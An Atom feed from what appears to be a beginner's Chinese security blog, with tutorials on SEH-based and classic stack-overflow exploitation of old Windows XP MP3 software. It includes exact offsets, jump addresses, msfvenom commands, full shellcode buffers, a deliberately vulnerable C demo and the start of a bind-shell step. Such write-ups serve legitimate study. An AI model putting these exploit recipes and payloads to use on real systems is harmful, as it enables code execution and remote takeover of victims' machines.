<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>杂毛小鸡</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://bigkan.github.io/"/>
  <updated>2019-04-24T06:31:21.190Z</updated>
  <id>https://bigkan.github.io/</id>
  
  <author>
    <name>杂毛小鸡</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>利用SEH的栈溢出</title>
    <link href="https://bigkan.github.io/2019/04/24/%E5%88%A9%E7%94%A8SEH%E7%9A%84%E6%A0%88%E6%BA%A2%E5%87%BA/"/>
    <id>https://bigkan.github.io/2019/04/24/利用SEH的栈溢出/</id>
    <published>2019-04-23T16:00:00.000Z</published>
    <updated>2019-04-24T06:31:21.190Z</updated>
    
    <content type="html"><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><blockquote><p>在看了《Exploit编写系列教程》的第三章和几篇SEH的博客后稍微记录一下。最后虽然整个分析的流程和教程的一模一样，但是用msf生成的payload并没有成功弹出计算器。我还是个新手小白所以虽然看了很久的教程但还是有一些不是很清楚。下面从下面三个部分记录一下</p><ul><li>1.SEH的概念和一些数据结构</li><li>2.利用SEH进行栈溢出的原理</li><li>3.《Exploit编写系列教程》中的案例分析<a id="more"></a></li></ul></blockquote><h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><ul><li>运行环境：Windows XP Professional EN (SP0)</li><li>调试软件：olldbg 2.0</li><li>python：2.7</li><li>有漏洞软件：Soritong MP3 player 1.0</li><li>所有代码，软件都在下面的百度云链接中</li></ul><h1 id="SEH概述"><a href="#SEH概述" class="headerlink" title="SEH概述"></a>SEH概述</h1><blockquote><p>SEH即异常处理结构体（Structure Exception Handler），是Windows异常处理机制的重要数据结构。下面只简单介绍几个必要的概念：</p></blockquote><ul><li>结构化异常处理是基于线程的。当线程初始化时会自动向栈中安装一个SEH作为线程默认的异常处理</li><li>在程序源码中使用<strong>try{}</strong>except{}或者Assert等异常处理机制，编译器将最终通过当前函数栈中安装一个SEH来实现异常处理</li><li>每个SEH包含一个_EXCEPTION_REGISTRATION结构体。结构体包含两个DWORD指针:SEH链表指针（Next SEH Recorder）和异常处理函数句柄（Exception Handler）</li><li>栈中一般会有多个SEH</li><li>栈中多个SEH通过链表的指针（Next SEH Recorder）在栈内由栈顶向栈底串成单向链表</li><li>TEB的0字节处（FS:[0]）指向最顶上的SEH。所以当异常发生时，系统首先从TEB的0字节处取得第一个SEH结构进行异常处理。当异常处理函数无法处理该异常时，会顺着SEH链寻找下一个异常处理函数来处理。如果都无法处理，最后一个SEH链表指针会指向0xFFFFFFFF表示是最后一个SEH，一般这时就会弹出一个我们常见的报错，然后程序退出。下图就是SEH调用链</li></ul><p><img src="/2019/04/24/利用SEH的栈溢出/SEH链.png" alt="SEH调用链"></p><h1 id="利用SEH进行栈溢出的原理"><a href="#利用SEH进行栈溢出的原理" class="headerlink" title="利用SEH进行栈溢出的原理"></a>利用SEH进行栈溢出的原理</h1><ul><li><ol><li>SEH放在栈内，可能会被溢出的数据把Next SEH Recorder和Exception Handler覆盖</li></ol></li><li><ol start="2"><li>将Exception Handler覆盖为ShellCode的入口地址</li></ol></li><li><ol start="3"><li>溢出数据触发异常，使系统调用SEH链进行异常处理</li></ol></li></ul><blockquote><p>下面实验中，将Next SEH Recorder覆盖为”\xeb\x06\x90\x90”（jmp 0x06 nop nop的机器码，向后跳转到ShellCode的入口地址），将Exception Handler覆盖为pop pop ret的地址，再将Exception Handler后面的内容覆盖为ShellCode内容。为什么要找pop pop ret来使用呢？下面是调用Exception Handler时的栈帧，下一个EXCEPTION_REGISTRATION结构在ESP+08的地方，执行了pop pop ret后正好把EXCEPTION_REGISTRATION的地址（就是前面的Next SEH Recorder的地址）送入到EIP中，程序跳转到执行jmp 0x06正好跳转到shellcode代码地址处执行。</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">EBP-00 _ebp</span><br><span class="line">EBP-04 trylevel</span><br><span class="line">EBP-08 scopetable数组指针</span><br><span class="line">EBP-0C handler函数地址</span><br><span class="line">EBP-10指向下一个EXCEPTION_REGISTRATION结构</span><br><span class="line">EBP-14 GetExceptionInformation</span><br><span class="line">EBP-18 栈帧中的标准ESP</span><br></pre></td></tr></table></figure><h1 id="实例分析"><a href="#实例分析" class="headerlink" title="实例分析"></a>实例分析</h1><h2 id="找到溢出点"><a href="#找到溢出点" class="headerlink" title="找到溢出点"></a>找到溢出点</h2><blockquote><p>已经知道5000个A的UI.txt会触发Soritong MP3 player 1.0的SEH，表现就是程序闪退并没有出现默认的报错（当然这也不能判断一定覆盖到了SEH）。先用patter.py生成5000个字符，然后用ollydbg来调试该软件找到是哪几个覆盖了NSEH和Handler。如下图所示。NSEH被4At5成功覆盖，Handler被At6A覆盖。通过pattern.py可以知道4At5在584。现在也就已经得到exp的组成结构了:<strong>[‘A’*584][“\xeb\x06\x90\x90”][pop pop ret的地址][ShellCode][‘A’*1000触发溢出]</strong></p></blockquote><p><img src="/2019/04/24/利用SEH的栈溢出/findESH.png" alt="覆盖点"><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(py2) C:\workplace\tools&gt;python pattern.py 4At5</span><br><span class="line">Pattern 4At5 first occurrence at position 584 in pattern.</span><br></pre></td></tr></table></figure></p><h2 id="找到pop-pop-ret"><a href="#找到pop-pop-ret" class="headerlink" title="找到pop pop ret"></a>找到pop pop ret</h2><blockquote><p>为了exp的稳定性一般选用软件自带的DLL来作为跳板，这次使用软件自带的player.dll。在ollydbg的player.dll的汇编代码区右键-&gt;search for-&gt;sequence of commands输入pop ESI pop EDI ret。找到地址为0x1009e812 (中间不能出现0x00)</p></blockquote><h2 id="生成shellcode"><a href="#生成shellcode" class="headerlink" title="生成shellcode"></a>生成shellcode</h2><blockquote><p>现在就剩最后一步了就是生成shellcode。但是这步我用msf没有生成的shellcode并没有成功弹出计算器，但是用他的shellcode却成功弹了计算器。下面是shellcode代码</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">buf = <span class="string">""</span></span><br><span class="line"><span class="comment"># success</span></span><br><span class="line">buf +=<span class="string">"\xeb\x03\x59\xeb\x05\xe8\xf8\xff\xff\xff\x4f\x49\x49\x49\x49\x49"</span></span><br><span class="line">buf +=<span class="string">"\x49\x51\x5a\x56\x54\x58\x36\x33\x30\x56\x58\x34\x41\x30\x42\x36"</span></span><br><span class="line">buf +=<span class="string">"\x48\x48\x30\x42\x33\x30\x42\x43\x56\x58\x32\x42\x44\x42\x48\x34"</span></span><br><span class="line">buf +=<span class="string">"\x41\x32\x41\x44\x30\x41\x44\x54\x42\x44\x51\x42\x30\x41\x44\x41"</span></span><br><span class="line">buf +=<span class="string">"\x56\x58\x34\x5a\x38\x42\x44\x4a\x4f\x4d\x4e\x4f\x4a\x4e\x46\x44"</span></span><br><span class="line">buf +=<span class="string">"\x42\x30\x42\x50\x42\x30\x4b\x38\x45\x54\x4e\x33\x4b\x58\x4e\x37"</span></span><br><span class="line">buf +=<span class="string">"\x45\x50\x4a\x47\x41\x30\x4f\x4e\x4b\x38\x4f\x44\x4a\x41\x4b\x48"</span></span><br><span class="line">buf +=<span class="string">"\x4f\x35\x42\x32\x41\x50\x4b\x4e\x49\x34\x4b\x38\x46\x43\x4b\x48"</span></span><br><span class="line">buf +=<span class="string">"\x41\x30\x50\x4e\x41\x43\x42\x4c\x49\x39\x4e\x4a\x46\x48\x42\x4c"</span></span><br><span class="line">buf +=<span class="string">"\x46\x37\x47\x50\x41\x4c\x4c\x4c\x4d\x50\x41\x30\x44\x4c\x4b\x4e"</span></span><br><span class="line">buf +=<span class="string">"\x46\x4f\x4b\x43\x46\x35\x46\x42\x46\x30\x45\x47\x45\x4e\x4b\x48"</span></span><br><span class="line">buf +=<span class="string">"\x4f\x35\x46\x42\x41\x50\x4b\x4e\x48\x46\x4b\x58\x4e\x30\x4b\x54"</span></span><br><span class="line">buf +=<span class="string">"\x4b\x58\x4f\x55\x4e\x31\x41\x50\x4b\x4e\x4b\x58\x4e\x31\x4b\x48"</span></span><br><span class="line">buf +=<span class="string">"\x41\x30\x4b\x4e\x49\x38\x4e\x45\x46\x52\x46\x30\x43\x4c\x41\x43"</span></span><br><span class="line">buf +=<span class="string">"\x42\x4c\x46\x46\x4b\x48\x42\x54\x42\x53\x45\x38\x42\x4c\x4a\x57"</span></span><br><span class="line">buf +=<span class="string">"\x4e\x30\x4b\x48\x42\x54\x4e\x30\x4b\x48\x42\x37\x4e\x51\x4d\x4a"</span></span><br><span class="line">buf +=<span class="string">"\x4b\x58\x4a\x56\x4a\x50\x4b\x4e\x49\x30\x4b\x38\x42\x38\x42\x4b"</span></span><br><span class="line">buf +=<span class="string">"\x42\x50\x42\x30\x42\x50\x4b\x58\x4a\x46\x4e\x43\x4f\x35\x41\x53"</span></span><br><span class="line">buf +=<span class="string">"\x48\x4f\x42\x56\x48\x45\x49\x38\x4a\x4f\x43\x48\x42\x4c\x4b\x37"</span></span><br><span class="line">buf +=<span class="string">"\x42\x35\x4a\x46\x42\x4f\x4c\x48\x46\x50\x4f\x45\x4a\x46\x4a\x49"</span></span><br><span class="line">buf +=<span class="string">"\x50\x4f\x4c\x58\x50\x30\x47\x45\x4f\x4f\x47\x4e\x43\x36\x41\x46"</span></span><br><span class="line">buf +=<span class="string">"\x4e\x36\x43\x46\x42\x50\x5a"</span></span><br></pre></td></tr></table></figure><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><blockquote><p>总结就用那个公式就能解释在以前的windows系统上利用SEH的原理:<strong>[填充触发SEH][“\xeb\x06\x90\x90”][pop pop ret的地址][ShellCode][填充触发SEH]</strong></p></blockquote><ul><li><a href="https://blog.csdn.net/chenlycly/article/details/52575260" target="_blank" rel="noopener">SEH相关文章链接</a></li><li><a href="https://pan.baidu.com/s/1cFOWWJj1IaMHh67FBdbQgA" target="_blank" rel="noopener">配套资料百度云链接</a>     提取码：bxa1</li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;简介&quot;&gt;&lt;a href=&quot;#简介&quot; class=&quot;headerlink&quot; title=&quot;简介&quot;&gt;&lt;/a&gt;简介&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;在看了《Exploit编写系列教程》的第三章和几篇SEH的博客后稍微记录一下。最后虽然整个分析的流程和教程的一模一样，但是用msf生成的payload并没有成功弹出计算器。我还是个新手小白所以虽然看了很久的教程但还是有一些不是很清楚。下面从下面三个部分记录一下&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;1.SEH的概念和一些数据结构&lt;/li&gt;
&lt;li&gt;2.利用SEH进行栈溢出的原理&lt;/li&gt;
&lt;li&gt;3.《Exploit编写系列教程》中的案例分析&lt;/li&gt;&lt;/ul&gt;&lt;/blockquote&gt;
    
    </summary>
    
    
      <category term="栈溢出" scheme="https://bigkan.github.io/tags/%E6%A0%88%E6%BA%A2%E5%87%BA/"/>
    
      <category term="安全" scheme="https://bigkan.github.io/tags/%E5%AE%89%E5%85%A8/"/>
    
      <category term="基础" scheme="https://bigkan.github.io/tags/%E5%9F%BA%E7%A1%80/"/>
    
  </entry>
  
  <entry>
    <title>栈溢出原理及实验</title>
    <link href="https://bigkan.github.io/2019/04/15/%E6%A0%88%E6%BA%A2%E5%87%BA%E5%8E%9F%E7%90%86%E5%8F%8A%E5%AE%9E%E9%AA%8C/"/>
    <id>https://bigkan.github.io/2019/04/15/栈溢出原理及实验/</id>
    <published>2019-04-14T16:42:07.000Z</published>
    <updated>2019-04-14T17:15:07.347Z</updated>
    
    <content type="html"><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><blockquote><p>在看了《0day安全：软件漏洞分析技术》的前几章和《Exploit编写系列教程》的第一章之后，简单记录一下自己遇到的问题，一些资源和简单命令。下面主要从3个方面出发记录。1.栈溢出的原理及简单demo实验。2.具体软件栈溢出的利用（不是挖掘栈溢出漏洞，是已经知道后怎么利用）。3.Metasploit的简单使用。<br><a id="more"></a></p></blockquote><h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><blockquote><p>系统版本，软件的编译选项等会对栈溢出是否生效产生影响。建议最好在虚拟机中进行实验</p><ul><li>栈溢出软件运行环境：吾爱破解论坛的虚拟机（WinXp sp3）</li><li>olldbg  x32_dbg</li><li>攻击机：Kali</li><li>python：2.7</li><li>所有代码，软件都在下面的百度云链接中<a href="https://pan.baidu.com/s/1K2pjScAM5x2OIGtnhA4cpw" target="_blank" rel="noopener">资料</a> 提取码：7inm </li></ul></blockquote><h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><h2 id="栈"><a href="#栈" class="headerlink" title="栈"></a>栈</h2><blockquote><p>栈是一种LIFO（后进先出）的数据结构。最常见两种操作：压栈（PUSH）,出栈（POP）。函数在调用时需要把用到的参数压入栈中，并且把EBP（栈基址）和EIP（函数调用返回后执行的下一条命令地址）也压入栈中。</p></blockquote><h2 id="函数调用"><a href="#函数调用" class="headerlink" title="函数调用"></a>函数调用</h2><blockquote><p>不同的声明对函数调用的处理有一些区别。</p></blockquote><table><thead><tr><th>调用约定的声明</th><th>参数入栈顺序</th><th>恢复栈平衡的位置</th></tr></thead><tbody><tr><td>__cdecl</td><td>右-&gt;左</td><td>母函数</td></tr><tr><td>__fastcall</td><td>右-&gt;左</td><td>子函数</td></tr><tr><td>__stdcall</td><td>右-&gt;左</td><td>子函数</td></tr></tbody></table><blockquote><p>函数调用的一般步骤</p><ol><li>参数入栈：参数从右到左依次压入系统栈中</li><li>返回地址入栈： 将当前指令的下一条代码地址压入栈中，供返回后使用</li><li>代码区跳转： 处理器从当前代码区跳转到被调用函数的入口处</li><li>栈帧调整：保存当前栈帧状态值，以备后面恢复栈帧使用（EBP入栈）；将当前栈帧切换到新栈帧（将ESP值装入EBP，更新栈帧底部）；给新栈帧分配空间（把ESP减去所需空间的大小，抬高栈顶）；<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">;func_add(int a,int b)</span></span><br><span class="line"><span class="keyword">push</span> b<span class="comment">;b入栈</span></span><br><span class="line"><span class="keyword">push</span> a<span class="comment">;a入栈</span></span><br><span class="line"><span class="keyword">call</span> func_add<span class="comment">;调用add做了两件事情1.将下一条命令地址压入栈中2.跳转到函数入口</span></span><br><span class="line"><span class="keyword">push</span> <span class="built_in">ebp</span><span class="comment">;保存上一个栈的底部</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">ebp</span>,<span class="built_in">esp</span><span class="comment">;设置新栈的底部</span></span><br><span class="line"><span class="keyword">sub</span> <span class="built_in">esp</span>,xxx<span class="comment">;设置栈帧的顶部，抬高栈空间</span></span><br></pre></td></tr></table></figure></li></ol></blockquote><p>下图为main调用func_add时栈的状态示意图<br><img src="/2019/04/15/栈溢出原理及实验/函数调用原理.png" alt="函数调用原理"></p><h1 id="栈溢出简单Demo"><a href="#栈溢出简单Demo" class="headerlink" title="栈溢出简单Demo"></a>栈溢出简单Demo</h1><p>实验环境</p><table><thead><tr><th></th><th>推荐使用的环境</th><th>备注</th></tr></thead><tbody><tr><td>操作系统</td><td>win32Xp SP2</td><td>我是在WinXp sp3进行实验的</td></tr><tr><td>编译器</td><td>VC6.0</td><td>其他编译器需要重新调试</td></tr><tr><td>编译选项</td><td>默认编译选项</td><td>VS2003和VS2005中的GS编译选项会使栈溢出失败</td></tr><tr><td>build版本</td><td>debug</td><td>使用release版本需要重新调试</td></tr></tbody></table><p>实验代码<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// stack_overflow_var.exe</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PASSWORD <span class="meta-string">"1234567"</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">verify_password</span> <span class="params">(<span class="keyword">char</span> *password)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> authenticated;</span><br><span class="line"><span class="keyword">char</span> buffer[<span class="number">8</span>];<span class="comment">// add local buff</span></span><br><span class="line">authenticated=<span class="built_in">strcmp</span>(password,PASSWORD);</span><br><span class="line"><span class="built_in">strcpy</span>(buffer,password);<span class="comment">//over flowed here!</span></span><br><span class="line"><span class="keyword">return</span> authenticated;</span><br><span class="line">&#125;</span><br><span class="line">main()</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">int</span> valid_flag=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">char</span> password[<span class="number">1024</span>];</span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"please input password:       "</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%s"</span>,password);</span><br><span class="line"></span><br><span class="line">valid_flag = verify_password(password);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(valid_flag)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"incorrect password!\n\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Congratulation! You have passed the verification!\n"</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><blockquote><p>可以看到输入password时并没有限制长度，但是在verify_password中复制password到buff时，buff只有8个字节的长度，可能会产生溢出。下图是当我们输入7个q时栈的状态。</p></blockquote><p><img src="/2019/04/15/栈溢出原理及实验/栈帧布局.jpg" alt="栈帧布局"></p><blockquote><p>c/c++判断字符串结尾是根据null来判断的，当遇到null时就是字符串结尾。Null在代码中表示为0x00。当我们输入8个q时，最后的null会溢出将0x00000001覆盖为0x00000000即authenticated返回为false，程序就会返回“Congratulation! You have passed the verification!”表示password相等的提示。这就完成了简单的溢出。当然如果我们输入的password足够长，可将返回地址也给覆盖掉，转而执行其他函数。下图为ollydbg调试执行了strcpy之后的栈。</p></blockquote><p><img src="/2019/04/15/栈溢出原理及实验/输入8个q之后的栈.png" alt="输入8个q之后的栈"></p><h1 id="具体软件栈溢出的利用"><a href="#具体软件栈溢出的利用" class="headerlink" title="具体软件栈溢出的利用"></a>具体软件栈溢出的利用</h1><blockquote><p>这个漏洞最早被发在packetstormsecurity.org中,<a href="https://packetstormsecurity.com/files/79307/Easy-RM-To-MP3-Converter-2.7.3.700-Overflow.html" target="_blank" rel="noopener">原文链接</a>。为了进行实验我去网上找到了这个<a href="https://www.exploit-db.com/exploits/10374" target="_blank" rel="noopener">软件和POC</a>。如果访问不了这几个网站的话，在文章的开头的百度云链接中也有这个软件。因为是第一次做这个实验所以也遇到挺多坑的，给的POC也并不能运行。所以我的目标就是根据文章利用MSF写出POC。</p></blockquote><h2 id="定位到溢出点"><a href="#定位到溢出点" class="headerlink" title="定位到溢出点"></a>定位到溢出点</h2><blockquote><p>根据文章我们知道crash.m3u文件的25000到30000之间的某个位置。所以就用 <strong>pattern.py 5000</strong>（msf中pattern_create.rb和pattern_offset.rb可以做相同的事情）来生成5000字符长度的字符串，方便我们根据崩溃时的提示定位到EIP（就是前面提到的返回地址）。下图为崩溃时的提示0x366a4235。现在就可以用这个去查偏移，就能确定是哪几个字节把EIP给覆盖了。</p></blockquote><p><img src="/2019/04/15/栈溢出原理及实验/findEIP.png" alt="崩溃时的提示"><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(base) C:\workplace\tools&gt;python pattern.py 0x366a4235</span><br><span class="line">Pattern 0x366a4235 first occurrence at position 1067 in pattern.</span><br></pre></td></tr></table></figure></p><blockquote><p>查询偏移可以知道偏移为1067个字节。所以前面需要26067个字节去填充（一般使用A字符去填充，当然也可以是随意的），之后的4个字节会将返回地址给覆盖了。现在用’BBBB’来代替这个4个字节去测试。可以看到返回的报错改成了0x42424242(就是ascii的’BBBB’)。</p></blockquote><h2 id="找到jmp-ESP"><a href="#找到jmp-ESP" class="headerlink" title="找到jmp ESP"></a>找到jmp ESP</h2><blockquote><p>为什么要找jmp ESP?一般情况下，ESP寄存器中的地址总是指向系统栈且不会被溢出的数据破坏。函数返回时，ESP所指的位置恰好是我们所淹没的返回地址的下一个。有时候也可以观察，寄存器的情况，并不一定非要使用jmp esp。我这里使用的是x32_dbg需要先设置x32_dbg为默认的实时调试器。options-&gt;perferences-&gt;mis把Set x64_dbg as Just In Time Debugger勾选。当软件崩溃时，点击取消，会自动启动调试器附加。</p></blockquote><blockquote><p>点击Symbols-&gt;双击可能存在的动态链接库-&gt;右键search for command-&gt;输入jmp esp 下面是我在kernel.dll中找到的jmp esp指令的地址0x7C874413.当然我们也可以用代码去查找0xFFE4(jmp esp的机器码为0xFFE4).当前计算机内存地址上的内容是指令还是数据是通过当前的上下文环境决定的,所以当用上面的办法找不到的时候,可以自己写代码来搜索内存中是否有0xFFE4</p></blockquote><p><img src="/2019/04/15/栈溢出原理及实验/jmpesp.png" alt="jmp esp"></p><h2 id="定位shellcode的位置"><a href="#定位shellcode的位置" class="headerlink" title="定位shellcode的位置"></a>定位shellcode的位置</h2><blockquote><p>经过上面的准备,我们需要查找我们输入的字符串哪些被填充到了ESP指向的地址.但是’BBBB’之后的字符串并没有全部直接被填充到了返回地址之后的栈中。我们需要去调试查看报错之后的栈，找到我们shellcode应该填写的位置。现在我们使用比较明显的字符串如’1abcdefghijklmnopqrstuvwxyz2abcdefghijklmnopqrstuvwxyz3abcdefghijklmnopqrstuvwxyz’方便我们定位我们的字符串在栈中的位置。通过下面这张图我们知道最前面的<strong>1abc</strong>并没有被压到栈中,而是从之后的’defg…’开始压入栈中。同时可以计算出压入栈的空间至少是104个字节（因为后面只写了4个a-z，除掉最开始的4个字节。104=27*4-4，最前面的4个字节是因为在返回时会先pop一个4字节的参数）</p></blockquote><p><img src="/2019/04/15/栈溢出原理及实验/ShellCodeAddress.png" alt="ShellCodeAddress"></p><h1 id="利用msf生成shellcode"><a href="#利用msf生成shellcode" class="headerlink" title="利用msf生成shellcode"></a>利用msf生成shellcode</h1><blockquote><p>一般情况下在可利用的栈空间较大时，可以在最前面先加入一定数量的’\x90’(\x90是nop的机器码)可以提高shellcode的成功率.接下来就是使用msf上的msfvenom生成shellcode，再生成exp。<br>msfvenom的一些参数</p><ul><li>-p shellcode的功能，也就是有效载荷</li><li>-b 避免出现什么字符这里使用的是 -b ‘\x00’，因为shellcode会因为\x00截断</li><li>-f 输出的shellcode格式</li><li>–list-options 有一些shellcode需要设置一些参数可以用这个命令查看需要的参数</li><li>-e 设置编码和解码格式。有时候为了避免一些字符需要进行编码。为了过免杀也需要编码</li></ul></blockquote><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">//下面是使用msf生成的代码，只需要把buf部分复制到之前的代码中替代后面的字符串就能生成有一定用的exp</span><br><span class="line">//这条命令会生成一个能弹一个计算器的exp</span><br><span class="line">PS C:\metasploit-framework\bin&gt; .\msfvenom.bat -p windows/exec CMD=calc.exe -b <span class="string">'\x00'</span> -f python</span><br><span class="line">[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload</span><br><span class="line">[-] No arch selected, selecting arch: x86 from the payload</span><br><span class="line">Found <span class="number">11</span> compatible encoders</span><br><span class="line">Attempting to encode payload with <span class="number">1</span> iterations of x86/shikata_ga_nai</span><br><span class="line">x86/shikata_ga_nai succeeded with size <span class="number">220</span> (iteration=<span class="number">0</span>)</span><br><span class="line">x86/shikata_ga_nai chosen with final size <span class="number">220</span></span><br><span class="line">Payload size: <span class="number">220</span> bytes</span><br><span class="line">Final size of python file: <span class="number">1060</span> bytes</span><br><span class="line">buf =  <span class="string">""</span></span><br><span class="line">buf += <span class="string">"\xba\xcb\xd0\xfc\x46\xd9\xca\xd9\x74\x24\xf4\x5b\x29"</span></span><br><span class="line">buf += <span class="string">"\xc9\xb1\x31\x31\x53\x13\x03\x53\x13\x83\xeb\x37\x32"</span></span><br><span class="line">buf += <span class="string">"\x09\xba\x2f\x31\xf2\x43\xaf\x56\x7a\xa6\x9e\x56\x18"</span></span><br><span class="line">buf += <span class="string">"\xa2\xb0\x66\x6a\xe6\x3c\x0c\x3e\x13\xb7\x60\x97\x14"</span></span><br><span class="line">buf += <span class="string">"\x70\xce\xc1\x1b\x81\x63\x31\x3d\x01\x7e\x66\x9d\x38"</span></span><br><span class="line">buf += <span class="string">"\xb1\x7b\xdc\x7d\xac\x76\x8c\xd6\xba\x25\x21\x53\xf6"</span></span><br><span class="line">buf += <span class="string">"\xf5\xca\x2f\x16\x7e\x2e\xe7\x19\xaf\xe1\x7c\x40\x6f"</span></span><br><span class="line">buf += <span class="string">"\x03\x51\xf8\x26\x1b\xb6\xc5\xf1\x90\x0c\xb1\x03\x71"</span></span><br><span class="line">buf += <span class="string">"\x5d\x3a\xaf\xbc\x52\xc9\xb1\xf9\x54\x32\xc4\xf3\xa7"</span></span><br><span class="line">buf += <span class="string">"\xcf\xdf\xc7\xda\x0b\x55\xdc\x7c\xdf\xcd\x38\x7d\x0c"</span></span><br><span class="line">buf += <span class="string">"\x8b\xcb\x71\xf9\xdf\x94\x95\xfc\x0c\xaf\xa1\x75\xb3"</span></span><br><span class="line">buf += <span class="string">"\x60\x20\xcd\x90\xa4\x69\x95\xb9\xfd\xd7\x78\xc5\x1e"</span></span><br><span class="line">buf += <span class="string">"\xb8\x25\x63\x54\x54\x31\x1e\x37\x32\xc4\xac\x4d\x70"</span></span><br><span class="line">buf += <span class="string">"\xc6\xae\x4d\x24\xaf\x9f\xc6\xab\xa8\x1f\x0d\x88\x47"</span></span><br><span class="line">buf += <span class="string">"\x6a\x0c\xb8\xcf\x33\xc4\xf9\x8d\xc3\x32\x3d\xa8\x47"</span></span><br><span class="line">buf += <span class="string">"\xb7\xbd\x4f\x57\xb2\xb8\x14\xdf\x2e\xb0\x05\x8a\x50"</span></span><br><span class="line">buf += <span class="string">"\x67\x25\x9f\x32\xe6\xb5\x43\x9b\x8d\x3d\xe1\xe3"</span></span><br></pre></td></tr></table></figure><p>当我们用那个软件打开我们生成的exp时，会自动弹出一个计算器，如下图所示。<br><img src="/2019/04/15/栈溢出原理及实验/calc.png" alt="calc"></p><p>现在我们尝试生成一个有远程shell的exp。想想也是有点激动。当软件打开exp时，软件不会有很明显的弹窗（感觉像软件崩溃了一样，不再对我的操作有反应），但是会打开4444端口等待连接。然后我用kali用telnet去连接<br><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span 